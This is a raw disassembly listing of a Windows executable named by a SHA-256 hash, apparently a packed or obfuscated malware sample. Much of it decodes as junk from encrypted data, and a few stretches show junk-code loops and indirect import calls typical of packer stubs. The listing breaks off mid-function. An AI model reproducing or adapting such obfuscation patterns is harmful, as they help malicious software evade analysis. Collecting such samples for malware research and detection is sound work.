
639caa46022d51b2f845846e94c6d8ba57d6ba14847b956e0c1dd2844a2f1a1f.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0x749ea18c
  40101f:	pop    ss
  401020:	jle    0x4010a0
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	rol    eax,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	push   cs
  401035:	jge    0x401037
  401037:	rdpmc  
  401039:	xadd   BYTE PTR [eax],bl
  40103c:	(bad)  
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x3bdfb59f
  4010d2:	pop    edx
  4010d3:	jno    0x4010fb
  4010d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010d6:	mov    BYTE PTR [esi+0x6a75625e],dl
  4010dc:	or     ecx,eax
  4010de:	aad    0xc8
  4010e0:	pop    esp
  4010e1:	push   esi
  4010e2:	add    DWORD PTR [eax+0x44],edi
  4010e5:	and    DWORD PTR [esi-0x440e971e],esp
  4010eb:	mov    ds:0x331f6ca8,eax
  4010f0:	dec    eax
  4010f1:	lahf   
  4010f2:	repz shl ecx,cl
  4010f5:	test   eax,0x6c6ba698
  4010fa:	shr    DWORD PTR [esi+0x3a35ff6c],cl
  401100:	retf   
  401101:	test   ebp,ebp
  401103:	or     BYTE PTR [edi+0x35793fdd],0xc3
  40110a:	push   cs
  40110b:	and    BYTE PTR [ebx-0x6387f544],ch
  401111:	fild   DWORD PTR ds:[eax+0x1f]
  401115:	xchg   ecx,eax
  401116:	repz jmp 0x401126
  401119:	mov    DWORD PTR [esi],0x7973099c
  40111f:	cmp    BYTE PTR [ebp-0x7b],dh
  401122:	sahf   
  401123:	push   edx
  401124:	js     0x401101
  401126:	cmp    bh,BYTE PTR [edx+0x7d3ed81a]
  40112c:	xchg   DWORD PTR [eax+0x2a],eax
  40112f:	add    DWORD PTR [eax+edx*2],edi
  401132:	mov    esi,0x8425f5cf
  401137:	stos   BYTE PTR es:[edi],al
  401138:	test   al,0xa
  40113a:	(bad)  
  40113b:	pop    eax
  40113c:	mov    ah,0xad
  40113e:	push   es
  40113f:	(bad)  
  401140:	rcl    BYTE PTR [eax],1
  401142:	or     BYTE PTR [eax+0x7d6fabf1],dl
  401148:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401149:	jo     0x401183
  40114b:	test   al,0x9
  40114d:	push   es
  40114e:	push   ebp
  40114f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  401151:	bound  edx,QWORD PTR [eax+0x17]
  401154:	addr16 jge 0x40115d
  401157:	mov    DWORD PTR [esi],edx
  401159:	inc    edi
  40115a:	ins    DWORD PTR es:[edi],dx
  40115b:	std    
  40115c:	mov    eax,ds:0x86eddf92
  401161:	cmp    al,0xf4
  401163:	loop   0x401190
  401165:	test   eax,0xfdabc497
  40116a:	and    al,0x41
  40116c:	or     BYTE PTR [edx],0xf6
  40116f:	mov    bh,0x34
  401171:	xlat   BYTE PTR ds:[ebx]
  401172:	mov    WORD PTR [edx],?
  401174:	inc    ebp
  401175:	and    eax,0x6f23f14c
  40117a:	aas    
  40117b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40117c:	test   eax,0x9d5ebca3
  401181:	loope  0x4011c9
  401183:	fldenv [esi+ebx*4+0x5d]
  401187:	stos   DWORD PTR es:[edi],eax
  401188:	xchg   esi,eax
  401189:	mov    ds:0x4b6f493a,eax
  40118e:	into   
  40118f:	cmp    cl,BYTE PTR [esi]
  401191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401192:	jbe    0x401180
  401194:	dec    esi
  401195:	fadd   DWORD PTR [ebp-0x1a]
  401198:	push   0x50
  40119a:	call   0xc913:0x19cbb079
  4011a1:	mov    eax,0x11ce990c
  4011a6:	and    dh,cl
  4011a8:	jmp    0x1aac3ef5
  4011ad:	mov    cl,BYTE PTR [ebp+0x4f7164fc]
  4011b3:	pop    esp
  4011b4:	test   eax,0x89f4d8f
  4011b9:	xchg   esp,eax
  4011ba:	and    eax,0x831f7566
  4011bf:	and    al,0x32
  4011c1:	test   eax,0x8f6e901e
  4011c6:	cmp    eax,0x8135abf
  4011cb:	outs   dx,DWORD PTR ds:[esi]
  4011cc:	cld    
  4011cd:	dec    edi
  4011ce:	mov    DWORD PTR [ebp-0x20],eax
  4011d1:	mov    ecx,0x5d3a
  4011d6:	mov    ecx,DWORD PTR [ebp-0x20]
  4011d9:	mov    DWORD PTR [ebp-0x24],0x4ec1
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x4302d5,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x4302d5
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x4302d5,ecx
  401209:	cmp    DWORD PTR ds:0x4302d5,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ea8b
  401248:	cmp    DWORD PTR ds:0x4302d5,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x4302d5
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x4302d5,ecx
  401262:	cmp    DWORD PTR ds:0x4302d5,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x4302cd,0x1e
  401279:	cmp    DWORD PTR ds:0x4302cd,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x4302cd,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e827
  40129c:	mov    ecx,DWORD PTR ds:0x4302cd
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x4302cd,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx+0x5399b7f1]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x401267
  4012cc:	mov    eax,0xa48ef0d8
  4012d1:	pop    edi
  4012d2:	(bad)  
  4012d3:	aam    0x60
  4012d5:	(bad)  
  4012d6:	into   
  4012d7:	out    0x5c,eax
  4012d9:	sar    esp,0xd3
  4012dc:	(bad)  
  4012dd:	cli    
  4012de:	hlt    
  4012df:	stos   DWORD PTR es:[edi],eax
  4012e0:	adc    al,BYTE PTR [ebx-0x52]
  4012e3:	sub    eax,DWORD PTR [ebp+0x7b]
  4012e6:	mov    ah,0x5c
  4012e8:	fisub  WORD PTR [ecx-0x5d6c878a]
  4012ee:	jb     0x401341
  4012f0:	mov    edi,DWORD PTR [ecx+0x1f38bc90]
  4012f6:	adc    al,0x6d
  4012f8:	inc    ecx
  4012f9:	fld    TBYTE PTR [eax+0x4c]
  4012fc:	xchg   ebp,eax
  4012fd:	ret    
  4012fe:	adc    ebx,DWORD PTR [ebp+0x519919dd]
  401304:	retf   0xf988
  401307:	cmc    
  401308:	mov    ds:0x5d49d978,al
  40130d:	mov    ecx,0xf6b1bb1e
  401312:	in     al,dx
  401313:	mov    ds:0xb6771b5b,al
  401318:	push   0x1b
  40131a:	addr16 push eax
  40131c:	or     eax,0xec1ab9ec
  401321:	adc    al,0xc1
  401323:	scas   al,BYTE PTR es:[edi]
  401324:	imul   BYTE PTR [ecx]
  401326:	jmp    0x865eb0d
  40132b:	cli    
  40132c:	or     al,0x6b
  40132e:	aas    
  40132f:	int    0xe7
  401331:	(bad)  
  401332:	stos   BYTE PTR es:[edi],al
  401333:	imul   esi,ecx,0xffffffa8
  401336:	imul   ebp,DWORD PTR [edx-0x648549da],0xffffffa3
  40133d:	jmp    0x5a6a6e87
  401342:	ret    
  401343:	pop    ebx
  401344:	cmp    ecx,DWORD PTR [eax]
  401346:	cmp    eax,0x4ce5030a
  40134b:	lahf   
  40134c:	mov    WORD PTR [edx+0x35],cs
  40134f:	cmp    DWORD PTR [esp+esi*8-0x70],edi
  401353:	adc    eax,0xf6645bfb
  401358:	xor    DWORD PTR [ebp-0x62abe38f],ebx
  40135e:	fwait
  40135f:	push   esp
  401360:	sahf   
  401361:	dec    edx
  401362:	adc    BYTE PTR ds:[ebx+0x113b9c7e],0x81
  40136a:	call   0x1d91:0xd8e929b3
  401371:	sar    BYTE PTR [edx+0x26],0xd8
  401375:	xor    ebx,ecx
  401377:	popa   
  401378:	into   
  401379:	fnstcw WORD PTR [edi+0x16db8f08]
  40137f:	arpl   WORD PTR ds:[edx+0x225f66d7],sp
  401386:	test   edx,edx
  401388:	cmc    
  401389:	and    al,0xd4
  40138b:	scas   eax,DWORD PTR es:[edi]
  40138c:	sub    DWORD PTR [edx+0xc415cc0],ebx
  401392:	lds    ebx,FWORD PTR [edx-0x2b705771]
  401398:	ds pop ebx
  40139a:	dec    esp
  40139b:	mov    ds:0xab4d8b9a,eax
  4013a0:	jecxz  0x4013b2
  4013a2:	and    al,0xbe
  4013a4:	sub    DWORD PTR [esi-0x26],0x19
  4013a8:	add    BYTE PTR [edx],bh
  4013aa:	dec    esi
  4013ab:	stos   DWORD PTR es:[edi],eax
  4013ac:	pop    ebx
  4013ad:	repnz and ecx,DWORD PTR [ebx+0x9bbf55b]
  4013b4:	fist   DWORD PTR [eax-0x76fafef0]
  4013ba:	ror    BYTE PTR [eax-0x6cfef47a],0x41
  4013c1:	clc    
  4013c2:	fiadd  DWORD PTR [edx+edi*2]
  4013c5:	jae    0x40141c
  4013c7:	push   0x68
  4013c9:	iret   
  4013ca:	(bad)  [edx+0x15606219]
  4013d0:	call   0xf8a3c787
  4013d5:	and    bl,BYTE PTR [edx-0x10683e63]
  4013db:	lock mov ch,0xe0
  4013de:	mov    edi,0xbb8307c2
  4013e3:	and    DWORD PTR ds:0x70b0a11f,ebp
  4013e9:	jp     0x4013fa
  4013eb:	in     eax,dx
  4013ec:	dec    eax
  4013ed:	and    al,0x73
  4013ef:	data16 test ah,al
  4013f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013f3:	in     eax,dx
  4013f4:	stc    
  4013f5:	add    eax,0x7bd0228d
  4013fa:	mov    dh,BYTE PTR [edx]
  4013fc:	mov    bh,0x32
  4013fe:	ret    0x2ad8
  401401:	xchg   BYTE PTR [ebp+0x4a],ah
  401404:	sub    eax,0x5a170daa
  401409:	lea    ecx,[edi]
  40140b:	or     BYTE PTR [edi+0x1d],dh
  40140e:	adc    eax,0x43efe261
  401413:	int    0xa2
  401415:	dec    esp
  401416:	inc    esi
  401417:	xor    dh,BYTE PTR [ecx]
  401419:	push   eax
  40141a:	fwait
  40141b:	add    BYTE PTR [esp+ebx*4-0x5b],ch
  40141f:	hlt    
  401420:	pop    eax
  401421:	mov    ecx,0xbb4770a4
  401426:	mov    ah,0xf3
  401428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401429:	fsub   st(2),st
  40142b:	retf   
  40142c:	rol    BYTE PTR [eax],0xbe
  40142f:	loopne 0x4013f2
  401431:	xor    eax,0x5fc5e962
  401436:	dec    ecx
  401437:	ror    DWORD PTR [edx-0x5d4f8f00],cl
  40143d:	je     0x401498
  40143f:	es mov edi,0x7b05b45e
  401445:	inc    edx
  401446:	(bad)  
  401447:	call   0xe8f7b74b
  40144c:	jmp    0xb4041f16
  401451:	pop    eax
  401452:	sbb    BYTE PTR [ebp+0x6d2ef5ff],dh
  401458:	aas    
  401459:	or     al,0x35
  40145b:	(bad)  
  40145c:	cld    
  40145d:	data16 ja 0x4013ee
  401460:	imul   edi,DWORD PTR [ecx+0x2a],0xffac3e36
  401467:	mov    ecx,0x79382388
  40146c:	(bad)  
  40146d:	xchg   edi,eax
  40146e:	jo     0x40147c
  401470:	mov    ebx,0x8a3cb956
  401475:	add    BYTE PTR [eax],al
  401477:	adc    DWORD PTR ds:0x42ec5b,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x4302b9
  40148b:	or     DWORD PTR ds:0x43036b,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x6b660fff
  4014a7:	cmp    eax,0x7e7dc281
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x401462
  4014b2:	jb     0x4014ef
  4014b4:	lea    ebp,[ebp+0x21]
  4014b7:	popf   
  4014b8:	xor    BYTE PTR [edi],dl
  4014ba:	loop   0x4014cf
  4014bc:	jmp    0x401527
  4014be:	add    edi,esi
  4014c0:	aaa    
  4014c1:	(bad)  ds:0xa9124ea4
  4014c7:	ins    DWORD PTR es:[edi],dx
  4014c8:	jns    0x4014a8
  4014ca:	out    dx,al
  4014cb:	rol    BYTE PTR [edi+0x78],cl
  4014ce:	sti    
  4014cf:	call   0xc0292b65
  4014d4:	pop    ebp
  4014d5:	setg   BYTE PTR [esi+0x54122d28]
  4014dc:	call   0x5ac1de67
  4014e1:	xchg   ebx,eax
  4014e2:	inc    edx
  4014e3:	(bad)  
  4014e4:	repz push eax
  4014e6:	ds ins DWORD PTR es:[edi],dx
  4014e8:	xor    eax,0x64fa701e
  4014ed:	mov    ds:0x91aef682,al
  4014f2:	and    al,0xd1
  4014f4:	lods   eax,DWORD PTR ds:[esi]
  4014f5:	sub    cl,ch
  4014f7:	pop    es
  4014f8:	repnz cli 
  4014fa:	jp     0x4014b4
  4014fc:	or     BYTE PTR [ebp+esi*2-0x63650a37],bl
  401503:	pop    ebp
  401504:	push   0x55
  401506:	inc    esp
  401507:	addr16 iret 
  401509:	bound  esp,QWORD PTR [esi]
  40150b:	jnp    0x40153c
  40150d:	(bad)  [edx-0x638cb7fa]
  401513:	or     eax,DWORD PTR [edi-0x1e12a652]
  401519:	in     al,0x9e
  40151b:	xchg   edi,eax
  40151c:	xchg   edi,eax
  40151d:	ror    BYTE PTR [edi+0x149e4480],0xc0
  401524:	dec    ebp
  401525:	jo     0x401570
  401527:	pop    edi
  401528:	loopne 0x401576
  40152a:	inc    esi
  40152b:	xchg   esp,eax
  40152c:	sbb    eax,0x76dcdbb7
  401531:	(bad)  
  401532:	sahf   
  401533:	out    0x2e,al
  401535:	dec    ecx
  401536:	(bad)  
  401537:	cmp    al,0x4f
  401539:	fmul   QWORD PTR [eax-0x2f]
  40153c:	mov    al,BYTE PTR [ebp+0x5a]
  40153f:	lock jmp 0x640ce367
  401545:	pop    ds
  401546:	mov    bh,0x70
  401548:	call   0x62d0e9b8
  40154d:	pop    ebp
  40154e:	mov    bh,0x5a
  401550:	xchg   edx,eax
  401551:	push   es
  401552:	push   ds
  401553:	cwde   
  401554:	pop    edi
  401555:	jo     0x401599
  401557:	inc    ebp
  401558:	fbstp  TBYTE PTR [edi-0x413d64a7]
  40155e:	jle    0x40154e
  401560:	inc    esp
  401561:	fld    DWORD PTR [esi-0x38d1c533]
  401567:	cmp    edx,ecx
  401569:	cmp    al,0xeb
  40156b:	(bad)  
  40156c:	cli    
  40156d:	repz push ecx
  40156f:	outs   dx,DWORD PTR ds:[esi]
  401570:	out    0x5a,eax
  401572:	retf   0x8f7
  401575:	fnstcw WORD PTR [ebx+0x70]
  401578:	mov    esp,0xd865618d
  40157d:	pop    ebx
  40157e:	dec    esp
  40157f:	or     ecx,edx
  401581:	out    dx,eax
  401582:	adc    eax,0x459758ee
  401587:	fs retf 0x6114
  40158b:	rcl    DWORD PTR [eax-0x4da27e71],0x2b
  401592:	test   al,0x87
  401594:	and    cl,BYTE PTR [ebp+0xd]
  401597:	mov    dh,0xd
  401599:	daa    
  40159a:	bound  ebx,QWORD PTR [ebp-0x6286bdba]
  4015a0:	(bad)  
  4015a2:	call   0xb3017ced
  4015a7:	nop
  4015a8:	cli    
  4015a9:	ins    DWORD PTR es:[edi],dx
  4015aa:	dec    esp
  4015ab:	dec    ebx
  4015ac:	or     al,0x2d
  4015ae:	xchg   edi,edi
  4015b0:	xor    cl,dl
  4015b2:	mov    ebp,0x7cffe1bf
  4015b7:	out    dx,al
  4015b8:	daa    
  4015b9:	dec    ebp
  4015ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015bb:	mov    ecx,0x5ee26a14
  4015c0:	mov    ah,0xa7
  4015c2:	aam    0xd5
  4015c4:	in     al,0xc9
  4015c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015c7:	and    esp,ecx
  4015c9:	pop    ss
  4015ca:	adc    BYTE PTR [esi-0x4b1f4d0f],0x42
  4015d1:	xchg   ebx,eax
  4015d2:	jle    0x4015f8
  4015d4:	out    dx,al
  4015d5:	jge    0x401598
  4015d7:	cmp    DWORD PTR [esi+0xb],0xffffffdf
  4015db:	cmp    cl,BYTE PTR [esp+ebx*2]
  4015de:	sbb    eax,0x34b40adf
  4015e3:	push   ebp
  4015e4:	inc    eax
  4015e5:	jb     0x40161a
  4015e7:	jle    0x4015e1
  4015e9:	push   ss
  4015ea:	fs pop ebp
  4015ec:	or     ebp,DWORD PTR [eax]
  4015ee:	(bad)  
  4015ef:	daa    
  4015f0:	cmp    bh,BYTE PTR ds:0x80aca157
  4015f6:	pop    edx
  4015f7:	repnz dec esi
  4015f9:	mov    ebx,0xbf2cee3
  4015fe:	(bad)  
  4015ff:	scas   eax,DWORD PTR es:[edi]
  401600:	push   cs
  401601:	leave  
  401602:	mov    WORD PTR [ebp*2-0x64e91c76],ss
  401609:	add    DWORD PTR [ebp-0x1],edi
  40160c:	and    ah,BYTE PTR ds:0xf5954d0f
  401612:	cmp    eax,0x2aba893e
  401617:	(bad)  
  401618:	jg     0x4015f0
  40161a:	xchg   edx,eax
  40161b:	imul   edi,DWORD PTR [ebx+0x7716bab0],0xffffffd6
  401622:	(bad)  
  401623:	jg     0x4015ef
  401625:	lea    esp,[esi-0x365034d9]
  40162b:	shl    edx,cl
  40162d:	mov    cl,0xd5
  40162f:	jo     0x40160e
  401631:	or     bl,0xba
  401634:	sbb    eax,0x7c53a1a2
  401639:	mov    dl,0x45
  40163b:	int3   
  40163c:	sahf   
  40163d:	push   es
  40163e:	add    DWORD PTR [esp+ebp*4],edx
  401641:	leave  
  401642:	dec    ecx
  401643:	ret    0x7bfa
  401646:	xor    DWORD PTR [esi+0x3585ec40],esp
  40164c:	xchg   BYTE PTR [ebp-0x42067725],dl
  401652:	scas   eax,DWORD PTR es:[edi]
  401653:	jns    0x40161f
  401655:	lock inc esp
  401657:	push   edi
  401658:	and    esi,edi
  40165a:	jmp    0x40181d
  40165f:	push   cs
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	loopne 0x40163b
  40166d:	adc    dh,BYTE PTR [esi+0x6c]
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x40169a
  401678:	out    0x29,eax
  40167a:	jmp    0x77d71665
  40167f:	fisttp WORD PTR [esi]
  401681:	inc    edx
  401682:	jbe    0x40163c
  401684:	xlat   BYTE PTR ds:[ebx]
  401685:	aaa    
  401686:	cld    
  401687:	aas    
  401688:	pop    ebp
  401689:	mov    cl,0xd9
  40168b:	mov    ds:0x70b6dbc7,al
  401690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401691:	loop   0x4016e8
  401693:	mov    bl,0x78
  401695:	xchg   edx,eax
  401696:	ja     0x4016dd
  401698:	in     eax,dx
  401699:	je     0x401677
  40169b:	cld    
  40169c:	push   ebp
  40169d:	mov    ch,0x20
  40169f:	ja     0x4016d9
  4016a1:	mov    al,0xdf
  4016a3:	lahf   
  4016a4:	fmul   DWORD PTR [edx-0x2070beee]
  4016aa:	lock outs dx,BYTE PTR ds:[esi]
  4016ac:	(bad)  
  4016ad:	in     al,0xc8
  4016af:	xlat   BYTE PTR ds:[ebx]
  4016b0:	retf   0x2c6a
  4016b3:	xchg   edx,eax
  4016b4:	xor    eax,0x95d254df
  4016b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016ba:	dec    esp
  4016bb:	add    esp,DWORD PTR [edx]
  4016bd:	jae    0x401697
  4016bf:	cmp    ebp,edi
  4016c1:	push   0xcb84119f
  4016c6:	push   cs
  4016c7:	aad    0xb2
  4016c9:	or     eax,0x4c0b398c
  4016ce:	mov    bl,0x4d
  4016d0:	fsub   DWORD PTR [esi+0x6b]
  4016d3:	jae    0x4016b3
  4016d5:	jl     0x401712
  4016d7:	leave  
  4016d8:	daa    
  4016d9:	addr16 fwait
  4016db:	jae    0x4016ef
  4016dd:	jle    0x4016bc
  4016df:	sub    BYTE PTR [eax-0x52a70c66],ch
  4016e5:	ret    0x86e7
  4016e8:	ins    DWORD PTR es:[edi],dx
  4016e9:	(bad)  [ebp*8-0x61d1951e]
  4016f0:	fisubr WORD PTR [esi-0xa]
  4016f3:	adc    eax,0x22ab1397
  4016f8:	sti    
  4016f9:	sbb    bl,BYTE PTR [esp+ecx*4-0x7e]
  4016fd:	out    0xe8,eax
  4016ff:	pop    ebx
  401700:	sub    al,0xd9
  401702:	not    DWORD PTR [edx+0x6b75c011]
  401708:	push   ebx
  401709:	les    ebx,FWORD PTR [ebx+edi*4-0x25733d54]
  401710:	jle    0x4016a5
  401712:	sbb    al,0x79
  401714:	imul   edx,DWORD PTR [edx-0x9c61944],0xd6219b5a
  40171e:	(bad)  
  401720:	out    0xcc,eax
  401722:	jmp    0xd62f:0xb67b8349
  401729:	(bad)  
  40172a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40172b:	les    esp,FWORD PTR [esi+0x7c]
  40172e:	jae    0x4016ee
  401730:	cld    
  401731:	pop    esp
  401732:	and    DWORD PTR [edi+0x5d],edi
  401735:	rcl    BYTE PTR [esi+0x5e],1
  401738:	rol    bl,0x3c
  40173b:	mov    esp,0x4c8fceff
  401740:	jg     0x401753
  401742:	xchg   DWORD PTR [eax],eax
  401744:	add    ebp,edi
  401746:	or     DWORD PTR [ebx+0x145e0cad],0xadeb76a8
  401750:	ret    
  401751:	or     dh,BYTE PTR [ebp+0x10]
  401754:	lahf   
  401755:	mov    BYTE PTR [edi+edi*1-0x1e],al
  401759:	fmul   DWORD PTR [ecx-0x26]
  40175c:	adc    esp,esp
  40175e:	jecxz  0x4016e3
  401760:	adc    al,0xea
  401762:	or     BYTE PTR ds:0xcaf34ad,dh
  401768:	mov    al,ds:0xdffe2908
  40176d:	int3   
  40176e:	xchg   ebp,eax
  40176f:	cmp    ecx,DWORD PTR [esi-0x32699c1d]
  401775:	shl    dl,cl
  401777:	in     eax,dx
  401778:	and    ebp,DWORD PTR [ebp+0x588df277]
  40177e:	xor    esi,DWORD PTR [esi]
  401780:	shl    DWORD PTR [ecx+eax*1],0x93
  401784:	dec    ebx
  401785:	iret   
  401786:	lds    esi,FWORD PTR [eax]
  401788:	jp     0x4017e4
  40178a:	into   
  40178b:	and    eax,0xe9b4a527
  401790:	push   ds
  401791:	mov    dh,0x56
  401793:	inc    esi
  401794:	add    al,dh
  401796:	sub    esi,esi
  401798:	idiv   BYTE PTR [edx]
  40179a:	inc    ecx
  40179b:	mov    bh,ch
  40179d:	ss cli 
  40179f:	xchg   ebp,eax
  4017a0:	gs ins BYTE PTR es:[edi],dx
  4017a2:	stos   BYTE PTR es:[edi],al
  4017a3:	or     BYTE PTR [ebp-0x9],ah
  4017a6:	ins    DWORD PTR es:[edi],dx
  4017a7:	sar    BYTE PTR [eax],0xc5
  4017aa:	fs mov ebp,0xe025f6f1
  4017b0:	sub    ch,BYTE PTR [edx+0x794ae295]
  4017b6:	loop   0x4017ed
  4017b8:	test   DWORD PTR [esi],0x5c88e910
  4017be:	mov    esi,ebx
  4017c0:	test   eax,0x2d501761
  4017c5:	inc    eax
  4017c6:	nop
  4017c7:	push   esp
  4017c8:	stos   BYTE PTR es:[edi],al
  4017c9:	sbb    al,0x7a
  4017cb:	mov    ecx,0xf78e15ad
  4017d0:	dec    ebp
  4017d1:	into   
  4017d2:	xchg   edx,eax
  4017d3:	ret    0xa156
  4017d6:	ds aas 
  4017d8:	mov    bl,ah
  4017da:	loop   0x40183c
  4017dc:	(bad)  
  4017dd:	dec    ecx
  4017de:	cld    
  4017df:	sbb    bh,BYTE PTR [edx-0x19f7d22a]
  4017e5:	jno    0x4017fe
  4017e7:	out    dx,eax
  4017e8:	cmp    eax,0xe127b121
  4017ed:	sbb    esi,DWORD PTR [edx-0x74af897d]
  4017f3:	push   ss
  4017f4:	fwait
  4017f5:	dec    edi
  4017f6:	add    eax,0x49bc6bef
  4017fb:	and    BYTE PTR [esi-0x89d0fcf],0xfe
  401802:	xchg   ecx,eax
  401803:	mov    eax,0x68ee557
  401808:	dec    ebx
  401809:	(bad)  
  40180a:	out    dx,eax
  40180b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40180c:	and    eax,DWORD PTR [ecx+0x55]
  40180f:	xchg   BYTE PTR [eax+0x29],ch
  401812:	xor    al,0x6f
  401814:	rcr    BYTE PTR [ecx+0x409f0349],1
  40181a:	xor    eax,0x2bf55d4
  40181f:	cmp    eax,DWORD PTR [eax]
  401821:	add    BYTE PTR [esi+0x3],ah
  401824:	mov    edi,0x4302d505
  40182a:	add    al,bl
  40182c:	pusha  
  40182d:	add    BYTE PTR [eax],al
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x4302d9,0x0
  40183c:	mov    esi,DWORD PTR ds:0x4302d9
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x4302d9,esi
  401849:	cmp    DWORD PTR ds:0x4302d9,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42e913
  401863:	cmp    DWORD PTR ds:0x4302d9,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x430363,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x430363
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x430363,esi
  401898:	cmp    DWORD PTR ds:0x430363,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x430363,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e82b
